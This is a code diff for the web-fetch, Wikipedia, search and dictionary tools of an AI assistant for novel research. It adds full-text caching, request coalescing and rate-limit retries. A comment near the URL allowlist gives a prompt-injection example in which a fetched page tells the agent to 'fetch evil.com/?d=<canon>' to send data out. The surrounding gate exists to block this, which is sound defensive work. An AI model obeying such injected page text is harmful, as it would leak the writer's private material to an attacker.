@@ -28,9 +28,11 @@ const USER_AGENT = 'WordBird-Biscuit/1.0 (novel research assistant)'
 // Fetched pages/articles are cached per project so the SAME material is
 // never re-downloaded turn after turn (research used to evaporate with the
 // conversation). Lives under agent-state: git-ignored, snapshot-excluded,
-// derived data — safe to delete any time.
+// derived data — safe to delete any time. Deliberately UNBOUNDED in entry
+// count (disk is not a constraint — writer decision); the only cleanup is
+// dropping TTL-expired entries. Entries store the FULL extracted text; the
+// context-window cap is applied at return time only.
 export const WEB_CACHE_TTL_MS = 7 * 86_400_000
-export const WEB_CACHE_MAX_ENTRIES = 150
 
 interface WebCacheEntry extends Record<string, unknown> {
   fetchedAt: number
@@ -77,24 +79,95 @@ const writeWebCache = (
       webCacheFile(root, kind, id),
       JSON.stringify({ ...payload, fetchedAt: Date.now() })
     )
-    const entries = fs.readdirSync(dir).filter((name) => name.endsWith('.json'))
-    if (entries.length > WEB_CACHE_MAX_ENTRIES) {
-      const byAge = entries
-        .map((name) => {
-          try {
-            return { name, mtime: fs.statSync(path.join(dir, name)).mtimeMs }
-          } catch {
-            return { name, mtime: 0 }
-          }
-        })
-        .sort((a, b) => b.mtime - a.mtime)
-      for (const { name } of byAge.slice(WEB_CACHE_MAX_ENTRIES)) {
+    // Housekeeping, not a cap: drop only entries past their TTL.
+    const cutoff = Date.now() - WEB_CACHE_TTL_MS
+    for (const name of fs.readdirSync(dir)) {
+      if (!name.endsWith('.json')) continue
+      try {
+        const stale =
+          (JSON.parse(fs.readFileSync(path.join(dir, name), 'utf8')) as WebCacheEntry)
+            .fetchedAt < cutoff
+        if (stale) fs.rmSync(path.join(dir, name), { force: true })
+      } catch {
         fs.rmSync(path.join(dir, name), { force: true })
       }
     }
   } catch {
     // The cache is an optimization — never fail the fetch over it.
   }
+}
+
+/** Cap cached full text down to the model-facing size at return time. */
+const capCachedText = <T extends Record<string, unknown>>(entry: T): T => {
+  if (typeof entry.text !== 'string' || entry.text.length <= MAX_TEXT_CHARS) return entry
+  return { ...entry, text: entry.text.slice(0, MAX_TEXT_CHARS), truncated: true }
+}
+
+// ---- In-flight coalescing ---------------------------------------------------
+// Parallel workers routinely research the same ground (two researchers,
+// one wiki page). Identical concurrent requests share ONE network call:
+// the second caller awaits the first's promise instead of re-fetching.
+const inFlight = new Map<string, Promise<unknown>>()
+
+const coalesce = async(key: string, work: () => Promise<unknown>): Promise<unknown> => {
+  const pending = inFlight.get(key)
+  if (pending) return pending
+  const promise = work().finally(() => inFlight.delete(key))
+  inFlight.set(key, promise)
+  return promise
+}
+
+// ---- Rate-limit tolerance ---------------------------------------------------
+// Free/keyless endpoints (DuckDuckGo, Wikipedia, dictionaryapi) throttle.
+// Retries happen HERE, mechanically, so a 429 never needs the writer (or
+// the model) to intervene. Delays are exported and mutable for tests.
+export const WEB_RETRY_DELAYS_MS = [1500, 4000, 10000]
+const RETRYABLE_STATUS = new Set([429, 502, 503])
+const RETRYABLE_CODES = new Set(['ECONNRESET', 'ETIMEDOUT', 'ECONNABORTED', 'EAI_AGAIN'])
+
+const sleep = (ms: number): Promise<void> => new Promise((resolve) => setTimeout(resolve, ms))
+
+const retryAfterMs = (headers: Record<string, unknown> | undefined): number | null => {
+  const raw = headers?.['retry-after']
+  if (typeof raw !== 'string' && typeof raw !== 'number') return null
+  const seconds = Number(raw)
+  if (Number.isFinite(seconds) && seconds >= 0) return Math.min(seconds * 1000, 30000)
+  return null
+}
+
+/**
+ * axios.get with graceful retry on rate limits and transient network
+ * failures. Honors Retry-After (capped 30s). Non-retryable failures and
+ * exhausted retries propagate exactly like a plain axios.get.
+ */
+const getWithRetry = async(
+  url: string,
+  config: Record<string, unknown>
+): Promise<{ status: number; data: unknown; headers: Record<string, unknown> }> => {
+  let lastError: unknown
+  for (let attempt = 0; attempt <= WEB_RETRY_DELAYS_MS.length; attempt++) {
+    try {
+      const response = await axios.get(url, config as never)
+      const status = Number(response.status)
+      if (RETRYABLE_STATUS.has(status) && attempt < WEB_RETRY_DELAYS_MS.length) {
+        await sleep(
+          retryAfterMs(response.headers as Record<string, unknown>) ??
+            WEB_RETRY_DELAYS_MS[attempt]
+        )
+        continue
+      }
+      return response as never
+    } catch (error) {
+      lastError = error
+      const err = error as { code?: string; response?: { status?: number } }
+      const retryable =
+        (err.code && RETRYABLE_CODES.has(err.code)) ||
+        (err.response?.status !== undefined && RETRYABLE_STATUS.has(err.response.status))
+      if (!retryable || attempt >= WEB_RETRY_DELAYS_MS.length) throw error
+      await sleep(WEB_RETRY_DELAYS_MS[attempt])
+    }
+  }
+  throw lastError
 }
 
 const str = (args: Record<string, unknown>, key: string): string => {
@@ -232,7 +305,7 @@ const safeLookup = makeSafeLookup()
 // exfiltration channel (an injected page saying "fetch evil.com/?d=<canon>").
 // Enforced HERE, mechanically, because prompts can be talked out of.
 
-const MAX_KNOWN_URLS = 500
+export const MAX_KNOWN_URLS = 5000
 const knownUrls = new Set<string>()
 
 /** Comparison form: case-normalized origin, no hash, query kept. */
@@ -328,9 +401,18 @@ const webFetch = async(
   const cacheId = normalizeUrl(rawUrl)
   if (args.refresh !== true && cacheId) {
     const cached = readWebCache(context.projectRoot, 'fetch', cacheId)
-    if (cached) return { ...cached, cached: true }
+    if (cached) return { ...capCachedText(cached), cached: true }
   }
 
+  // Two parallel workers fetching the same page share one network call.
+  return coalesce(`fetch:${cacheId ?? rawUrl}`, () => webFetchLive(rawUrl, cacheId, context))
+}
+
+const webFetchLive = async(
+  rawUrl: string,
+  cacheId: string | null,
+  context: AgentToolContext
+): Promise<unknown> => {
   let url = assertSafeUrl(rawUrl)
 
   // Provenance gate: only URLs the writer supplied or a search returned.
@@ -349,7 +431,7 @@ const webFetch = async(
   // targets are server-chosen, so they are exempt from provenance but
   // still pass assertSafeUrl.
   for (let hop = 0; hop <= MAX_REDIRECT_HOPS; hop++) {
-    const response = await axios.get(url.toString(), {
+    const response = await getWithRetry(url.toString(), {
       timeout: FETCH_TIMEOUT_MS,
       maxContentLength: MAX_RESPONSE_BYTES,
       maxRedirects: 0,
@@ -381,16 +463,18 @@ const webFetch = async(
     const isHtml = contentType.includes('html') || /^\s*</.test(body)
     const text = isHtml ? htmlToText(body) : body
 
-    const result = {
+    // The cache keeps the FULL extracted text (disk is not a constraint);
+    // only the model-facing return is capped. Keyed by the REQUESTED url —
+    // that is what gets asked for again.
+    const fullResult = {
       url: url.toString(),
       status: response.status,
       title: isHtml ? extractTitle(body) : '',
-      text: text.slice(0, MAX_TEXT_CHARS),
-      truncated: text.length > MAX_TEXT_CHARS
+      text,
+      truncated: false
     }
-    // Keyed by the REQUESTED url — that is what gets asked for again.
-    if (cacheId) writeWebCache(context.projectRoot, 'fetch', cacheId, result)
-    return result
+    if (cacheId) writeWebCache(context.projectRoot, 'fetch', cacheId, fullResult)
+    return capCachedText(fullResult)
   }
 
   return {
@@ -434,7 +518,7 @@ const webSearch = async(
   const query = str(args, 'query')
   const maxResults = Math.min(optInt(args, 'maxResults') ?? 5, 10)
 
-  const response = await axios.get('https://html.duckduckgo.com/html/', {
+  const response = await getWithRetry('https://html.duckduckgo.com/html/', {
     params: { q: query },
     timeout: FETCH_TIMEOUT_MS,
     maxContentLength: MAX_RESPONSE_BYTES,
@@ -474,7 +558,7 @@ const wikiSearch = async(
   const lang = sanitizeWikiLang(optStrLocal(args, 'lang'))
   const limit = Math.min(optInt(args, 'maxResults') ?? 5, 10)
 
-  const response = await axios.get(
+  const response = await getWithRetry(
     `https://${lang}.wikipedia.org/w/rest.php/v1/search/page`,
     {
       params: { q: query, limit },
@@ -483,8 +567,9 @@ const wikiSearch = async(
     }
   )
 
-  const pages = Array.isArray(response.data?.pages) ? response.data.pages : []
-  const results = pages.map((p: Record<string, unknown>) => ({
+  const searchData = response.data as { pages?: Array<Record<string, unknown>> } | undefined
+  const pages = Array.isArray(searchData?.pages) ? searchData.pages : []
+  const results = pages.map((p) => ({
     title: String(p.title ?? ''),
     description: String(p.description ?? ''),
     excerpt: htmlToText(String(p.excerpt ?? '')).slice(0, 300),
@@ -510,12 +595,21 @@ const wikiRead = async(
     const cached = readWebCache(context.projectRoot, 'wiki', cacheId)
     if (cached) {
       if (typeof cached.url === 'string') rememberUrl(cached.url)
-      return { ...cached, cached: true }
+      return { ...capCachedText(cached), cached: true }
     }
   }
 
+  return coalesce(`wiki:${cacheId}`, () => wikiReadLive(title, lang, cacheId, context))
+}
+
+const wikiReadLive = async(
+  title: string,
+  lang: string,
+  cacheId: string,
+  context: AgentToolContext
+): Promise<unknown> => {
   // Plain-text extract of the full article via the MediaWiki API.
-  const response = await axios.get(`https://${lang}.wikipedia.org/w/api.php`, {
+  const response = await getWithRetry(`https://${lang}.wikipedia.org/w/api.php`, {
     params: {
       action: 'query',
       prop: 'extracts',
@@ -529,7 +623,10 @@ const wikiRead = async(
     headers: { 'User-Agent': USER_AGENT }
   })
 
-  const pages = response.data?.query?.pages ?? {}
+  const wikiData = response.data as
+    | { query?: { pages?: Record<string, unknown> } }
+    | undefined
+  const pages = wikiData?.query?.pages ?? {}
   const first = Object.values(pages)[0] as
     | { title?: string; extract?: string; missing?: string }
     | undefined
@@ -544,16 +641,17 @@ const wikiRead = async(
   const text = first.extract
   const articleUrl = `https://${lang}.wikipedia.org/wiki/${encodeURIComponent(first.title ?? title)}`
   rememberUrl(articleUrl)
-  const result = {
+  // Full extract on disk; model-facing cap applied at return time.
+  const fullResult = {
     title: first.title ?? title,
     lang,
     found: true,
     url: articleUrl,
-    text: text.slice(0, MAX_TEXT_CHARS),
-    truncated: text.length > MAX_TEXT_CHARS
+    text,
+    truncated: false
   }
-  writeWebCache(context.projectRoot, 'wiki', cacheId, result)
-  return result
+  writeWebCache(context.projectRoot, 'wiki', cacheId, fullResult)
+  return capCachedText(fullResult)
 }
 
 // ---- Dictionary / thesaurus (keyless, dictionaryapi.dev) ----
@@ -567,7 +665,7 @@ const dictionaryLookup = async(
     throw new Error('Provide a single word (letters, apostrophes, hyphens only).')
   }
 
-  const response = await axios.get(
+  const response = await getWithRetry(
     `https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(word.toLowerCase())}`,
     {
       timeout: FETCH_TIMEOUT_MS,
